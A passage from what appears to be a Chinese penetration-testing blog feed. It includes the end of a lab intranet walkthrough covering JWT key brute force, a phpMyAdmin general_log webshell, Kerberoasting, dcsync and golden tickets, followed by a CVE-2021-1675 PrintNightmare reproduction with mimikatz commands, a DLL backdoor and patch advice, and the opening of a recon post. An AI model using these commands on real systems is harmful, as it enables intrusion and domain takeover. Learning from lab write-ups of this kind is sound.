src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-11-49_q8w5xg.png"></p><p>dumphash</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-12-10_rdyhcm.png"></p><p>至此 WEB1 和 DATA1 都已经拿下了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635857951/Xnip2021-11-02_20-58-31_bswpdi.png"></p><h2 id="DATA1-内网信息收集"><a href="#DATA1-内网信息收集" class="headerlink" title="DATA1 内网信息收集"></a>DATA1 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>双网卡主机，又发现一个网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866051/Xnip2021-11-02_23-14-00_kqnrxr.png"></p><p>扫描一下内网存活和端口</p><p>目标 192.168.183.136 开了 80 这台机器就是 WEB2，可以再探测一下主机名确定一下</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635859702/Xnip2021-11-02_21-28-07_b5whhl.png"></p><p>cs 开 socks 代理进内网访问 <a href="http://192.168.183.136/%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%80%E4%B8%AA">http://192.168.183.136/，发现是一个</a> jwt 样例页面</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860574/Xnip2021-11-02_21-34-52_w4b10m.png"></p><p>jwt 可以爆破 token</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860581/Xnip2021-11-02_21-38-02_jwy31k.png"></p><h2 id="JWT-Token-爆破"><a href="#JWT-Token-爆破" class="headerlink" title="JWT Token 爆破"></a>JWT Token 爆破</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjM1ODU5Nzk4LCJuYmYiOjE2MzU4NTk4MDgsImV4cCI6MTYzNTg2MDM5OCwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.Nix1dQr0cu6OVZmjgCHJ7wk3AaztGZH0ubZNFlKb9fg -C -d /Users/lin/Documents/security/dic/自己收集的/rockyou.txt</span><br></pre></td></tr></table></figure><p>成功爆破出了密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635860935/Xnip2021-11-02_21-48-37_ovtscz.png"></p><p>我刚开始以为是伪造一个 token 然后以管理员身份登陆后台之类的，但是我发现登陆之后只有用户名变了，没有其它任何可以利用的地方，我才发现思路错了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt token 密钥：[+] Qweasdzxc5 is the CORRECT key!</span><br></pre></td></tr></table></figure><p>想了半天也不知道这个密钥有啥用，无奈问了下月师傅，他说这个环境是 phpstudy pro 搭建的，说有 phpmyadmin</p><p>试了试几个常用的 phpmyadmin 路径，最终发现路径为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.183.136/phpMyAdmin4.8.5/</span><br></pre></td></tr></table></figure><p>这里确实有点脑洞，后来结束看了其他师傅的 WP，有的是扫目录发现了 phpmyadmin 的日志文件，有的是识别出了是 phpstudy pro 的环境，只能说我太菜了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635861501/Xnip2021-11-02_21-56-51_gkidun.png"></p><p>使用 root&#x2F;Qweasdzxc5 登陆 phpmyadmin，然后就是常规的操作，往根目录写 webshell 或者写日志 getshell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635861598/Xnip2021-11-02_21-59-48_hjooas.png"></p><h2 id="phpmyadmin-写日志-getshell"><a href="#phpmyadmin-写日志-getshell" class="headerlink" title="phpmyadmin 写日志 getshell"></a>phpmyadmin 写日志 getshell</h2><p>查看日志信息</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863373/Xnip2021-11-02_22-20-01_pqnnca.png"></p><p>打开 general_log 日志读写功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log=&#x27;on&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863403/Xnip2021-11-02_22-20-22_trzdbt.png"></p><p>更改日志存放路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log_file=&#x27;C:/phpstudy_pro/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863441/Xnip2021-11-02_22-24-12_wy7dto.png"></p><p>写 webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select &#x27;&lt;?php eval($_POST[pass]);?&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863453/Xnip2021-11-02_22-28-37_zfjri7.png"></p><p>蚁剑配置代理连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635863621/Xnip2021-11-02_22-32-18_nl8k7j.png"></p><h2 id="WEB2-上线-cs"><a href="#WEB2-上线-cs" class="headerlink" title="WEB2 上线 cs"></a>WEB2 上线 cs</h2><p>目标主机无杀软、但是不出网、需要转发上线，在 DATA1 上建立一个监听</p><p>以 DATA1 为监听生成一个 exe 后门上传到 WEB2 上执行</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_22-36-19_xryii6.png"></p><p>WEB2 正向上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866243/Xnip2021-11-02_23-17-09_toipcw.png"></p><h2 id="WEB2-内网信息收集"><a href="#WEB2-内网信息收集" class="headerlink" title="WEB2 内网信息收集"></a>WEB2 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>双网卡主机、域内成员机、有一个域 ack123.com，并且还有一个内网网段，第三层内网了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866501/Xnip2021-11-02_23-21-23_gy8bqd.png"></p><p>定位域控，我这里省事就直接 ping 了，可以用 cs 相关插件再确定一下，一般 dns 服务器就是域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ack123.com</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866900/Xnip2021-11-02_23-28-06_dgdhpe.png"></p><p>跑一波账户明文密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-19-56_l3pbnz.png"></p><p>dumphash</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-20-21_rx46rk.png"></p><h2 id="spn-票据爆破"><a href="#spn-票据爆破" class="headerlink" title="spn 票据爆破"></a>spn 票据爆破</h2><p>试了一波打域控方法无果，最后发现有 spn</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635905450/Xnip2021-11-03_10-10-38_i79g83.png"></p><h3 id="spn-简介"><a href="#spn-简介" class="headerlink" title="spn 简介"></a>spn 简介</h3><p>SPN，ServicePrincipal Names，即服务主体名称，是服务实例（比如：HTTP、SMB、MySQL 等服务）在使用 Kerberos 身份验证的网络上的唯一标识符，其由服务类、主机名和端口组成。Kerberos 认证过程使用 SPN 将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置 SPN。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户或域用户帐户下为服务器注册 SPN。对于内置机器帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册 SPN。</p><p>SPN 分为两种类型：</p><p>・一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。・另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</p><h3 id="SPN-服务主体名称发现"><a href="#SPN-服务主体名称发现" class="headerlink" title="SPN 服务主体名称发现"></a>SPN 服务主体名称发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*    # 查看当前域内所有的 SPN</span><br><span class="line">setspn -T whoamianony.org -Q */*    # 查看指定域 whoamianony.org 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPN</span><br><span class="line">setspn -L &lt;username&gt;/&lt;hostname&gt;    # 查找指定用户/主机名注册的 SPN</span><br></pre></td></tr></table></figure><h3 id="使用-GetUserSPNs-ps1-脚本"><a href="#使用-GetUserSPNs-ps1-脚本" class="headerlink" title="使用 GetUserSPNs.ps1 脚本"></a>使用 GetUserSPNs.ps1 脚本</h3><p>项目地址：<a href="https://github.com/nidem/kerberoast.git">https://github.com/nidem/kerberoast.git</a></p><p>GetUserSPNs 是 Kerberoast 工具集中的一个 PowerShell 脚本，可以用来查询域内用户注册的 SPN。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure><p>既然有 spn 服务，那么我们可以使用 mimikatz 请求指定 SPN 的服务票据，然后导出爆破域管密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com  #请求mysql的服务票据</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635905427/Xnip2021-11-03_10-10-06_irrxtd.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list    # 列出服务票据</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906079/Xnip2021-11-03_10-13-46_htlv6z.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export #导出服务票据</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906084/Xnip2021-11-03_10-15-04_x3kgfx.png"></p><p>使用工具爆破服务票据得到域管密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cracking 1 tickets...</span><br><span class="line">found password for ticket 0: P@55w0rd!  File: 1-40a10000-12server-web2$@mysql~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line">Successfully cracked all tickets</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906154/Xnip2021-11-03_10-22-07_afxdda.png"></p><p>使用 cs 自带工具扫一下存活</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635906344/Xnip2021-11-03_10-25-28_zoluca.png"></p><h2 id="DC-上线"><a href="#DC-上线" class="headerlink" title="DC 上线"></a>DC 上线</h2><p>已经有了域管密码，直接 psexec 横向 DC 即可，首先建立一个 smb 的监听</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-02-05_gv9tlh.png"></p><p>psexec 横向</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-03-08_lnwqpp.png"></p><p>DC 上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635908696/Xnip2021-11-03_11-04-44_vi6pii.png"></p><h2 id="DATA2-上线"><a href="#DATA2-上线" class="headerlink" title="DATA2 上线"></a>DATA2 上线</h2><p>同样直接 psexec 横向即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635921833/Xnip2021-11-03_14-43-20_m7ndye.png"></p><h2 id="权限维持之黄金票据"><a href="#权限维持之黄金票据" class="headerlink" title="权限维持之黄金票据"></a>权限维持之黄金票据</h2><p>抓 krbtgt 账户 hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:ack123.com /user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922097/Xnip2021-11-03_14-47-10_zpuend.png"></p><p>在 WEB2、DATA2 上制作黄金票据</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922096/Xnip2021-11-03_14-48-02_s5v9eh.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922130/Xnip2021-11-03_14-48-36_pprrq7.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list #列出票据</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922277/Xnip2021-11-03_14-51-05_fvuujf.png"></p><p>访问一下域控看看票据是否有效</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922372/Xnip2021-11-03_14-52-20_t4pns1.png"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>感谢月师傅幸苦搭建的靶场环境、三层内网渗透很有意思、在渗透过程中也发现了自身许多技术的不足（就是菜），靶场体验不错，这篇文章是考核之后复现的，当时 WP 没写那么仔细，因为已经打过一遍，难免会有白盒测试的思想影响，因此文章逻辑可能不是那么严谨，有些步骤也少了，最后附上一张全部上线的图，这个靶场到此结束了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635922632/Xnip2021-11-03_14-56-56_jzmwtw.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1675 Windows Print Spooler远程代码执行漏洞复现</title>
      <link href="/posts/775123418/"/>
      <url>/posts/775123418/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>6 月 9 日，微软发布 6 月安全更新补丁，修复了 50 个安全漏洞，其中包括一个 Windows Print Spooler 权限提升漏洞，漏洞 CVE 编号：CVE-2021-1675。未经身份验证的远程攻击者可利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。建议受影响用户及时更新漏洞补丁进行防护，做好资产自查以及预防工作，以免遭受黑客攻击。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Print Spooler 是 Windows 系统中用于管理打印相关事务的服务。</p><p>该漏洞在域环境中合适的条件下，无需任何用户交互，未经身份验证的远程攻击者就可以利用该漏洞以 SYSTEM 权限在域控制器上执行任意代码，从而获得整个域的控制权。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2012 R2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012 R2</span><br><span class="line"></span><br><span class="line">Windows Server 2012(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2012</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line"></span><br><span class="line">Windows RT 8.1</span><br><span class="line"></span><br><span class="line">Windows 8.1 for x64-based systems</span><br><span class="line"></span><br><span class="line">Windows 8.1 for 32-bit systems</span><br><span class="line"></span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line"></span><br><span class="line">Windows Server 2016(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2016</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1607 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1607 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows Server, version 20H2(Server Core Installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 20H2 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows Server, version 2004(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 2004 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 21H1 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line"></span><br><span class="line">Windows Server 2019(Server Core installation)</span><br><span class="line"></span><br><span class="line">Windows Server 2019</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for ARM64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for x64-based Systems</span><br><span class="line"></span><br><span class="line">Windows 10 Version 1809 for 32-bit Systems</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于博主日常生产环境是 mac，因此使用的是 VM Fusion 部署虚拟机、VM WorkStation 同样可以</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、Windows server 2016   </span><br><span class="line"></span><br><span class="line">迅雷下载：ed2k://|file|cn_windows_server_2016_x64_dvd_9718765.iso|6176450560|CF1B73D220F1160DE850D9E1979DBD50|/</span><br><span class="line"></span><br><span class="line">角色：域控  ip：172.16.1.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2、Windows 10 ，Version 1607</span><br><span class="line"></span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jul_2016_x64_dvd_9056935.iso|4347183104|35EA5DB0F3BB714F5CE0740FB89D82D1|/</span><br><span class="line"></span><br><span class="line">角色：域内普通主机 ip：172.16.1.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3、kali  ip：172.16.1.3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4、域内普通用户 test</span><br></pre></td></tr></table></figure><p>先用 cs 生成一个 dll 后门文件，Windows Print Spooler 会加载 dll 执行上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633325347/1_xjrpok.png"></p><p>Mimikatz 武器化利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gentilkiwi/mimikatz</span><br></pre></td></tr></table></figure><h3 id="本地权限提升"><a href="#本地权限提升" class="headerlink" title="本地权限提升"></a>本地权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">misc::printnightmare /library:C:\Users\test\Desktop\mimikatz_trunk\x64\mimispool.dll  /server:172.16.1.2 /authuser:test /authdomain:jhc.cn /authpassword:password</span><br><span class="line">#将mimispool.dll替换成cs生成的dll后门即可以system权限上线</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633326756/2_oqt82w.png"></p><h3 id="域控权限提升"><a href="#域控权限提升" class="headerlink" title="域控权限提升"></a>域控权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前提条件</span><br><span class="line">1、需要控制域内任意一台满足漏洞利用条件的主机</span><br><span class="line">2、需要一个域内普通账户，并且知道明文密码</span><br><span class="line">3、需要一台机器提供smb匿名访问</span><br></pre></td></tr></table></figure><p><strong>域控配置</strong></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327942/3_rw4slu.png"></p><p>我这里使用 kali 开启 smb 匿名访问，当然用域内被控机开启也是可以的，但是 windows 配置 smb 匿名访问有点问题，玄学</p><p>kali 开启 smb 匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba #安装smb服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf #修改smb配置文件添加如下内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">map to guest = Bad User</span><br><span class="line">server role = standalone server</span><br><span class="line">usershare allow guests = yes</span><br><span class="line">idmap config * : backend = tdb</span><br><span class="line">smb ports = 445</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">comment = Samba</span><br><span class="line">path = /tmp/ #可以修改共享目录，我这里用默认</span><br><span class="line">guest ok = yes</span><br><span class="line">read only = no</span><br><span class="line">browsable = yes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#重启smb服务</span><br><span class="line">systemctl restart smbd</span><br><span class="line">systemctl restart nmbd</span><br></pre></td></tr></table></figure><p>将 dll 后门文件放至 kali 中 tmp 目录下，以便能访问到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">misc::printnightmare /library:\\172.16.1.3\smb\b.dll  /server:172.16.1.1 /authuser:test /authdomain:jhc.cn /authpassword:password</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327946/4_pnbiju.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633327942/5_ug2c1t.png"></p><p>无需交互，域控以 system 权限上线</p><p>注意：本地复现建议关闭防火墙和杀毒软件</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>CVE-2021-1675 补丁更新</p><p>目前微软官方已针对支持的系统版本发布了修复 CVE-2021-1675 漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，</p><p>下载链接：<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><p>临时防护措施：</p><p>1、用户可通过停止并禁用 Print Spooler 服务对 CVE-2021-34527 漏洞进行缓解</p><p>步骤如下：</p><p>进入任务管理器，选择 “服务”-&gt;” 打开服务”-&gt;” 选择 Print Spooler”-&gt;” 右键属性”</p><p>启动类型” 选择” 禁用”，并点击” 停止”，关闭服务，点击” 应用” 和” 确定”，使配置生效。</p><p>注：停用此服务将导致打印功能失效。</p><p>2、通过组策略禁用入站远程打印</p><p>运行组策略编辑器（Win+R，输入 gpedit.msc，打开组策略编辑器），依次浏览到：计算机配置 &#x2F; 管理模板 &#x2F; 打印机：禁用 “允许打印后台处理程序接受客户端连接：” 策略以阻止远程攻击。</p><p>注：此策略将通过阻止入站远程打印操作来阻止远程攻击。该系统将不再用作打印服务器，但仍然可以本地打印到直接连接的设备。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外网打点到域控上线</title>
      <link href="/posts/1541051201/"/>
      <url>/posts/1541051201/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>网站主页</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631925058/1_m666qm.png"></p><h3 id="svn-泄露-SQLite-数据库文件"><a href="#svn-泄露-SQLite-数据库文件" class="headerlink" title=".svn 泄露 SQLite 数据库文件"></a>.svn 泄露 SQLite 数据库文件</h3><p>扫描目录发现.svn 信息泄露，wc.db 是 SQLite 数据库文件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631925418/2_g4utns.png"></p><h3 id="Thinkphp-日志泄露"><a href="#Thinkphp-日志泄露" class="headerlink" title="Thinkphp 日志泄露"></a>Thinkphp 日志泄露</h3><p>直接访问这个文件把它下载下来用 Navicat 打开</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631926547/3_r4eux6.png"></p><p>编写脚本遍历日志或者使用工具检测</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png"></p><p><strong>日志泄露管理员密码</strong></p><p>日志记录了管理员修改密码的操作</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1631927292/4_jzfvjh.png"></p><p><img 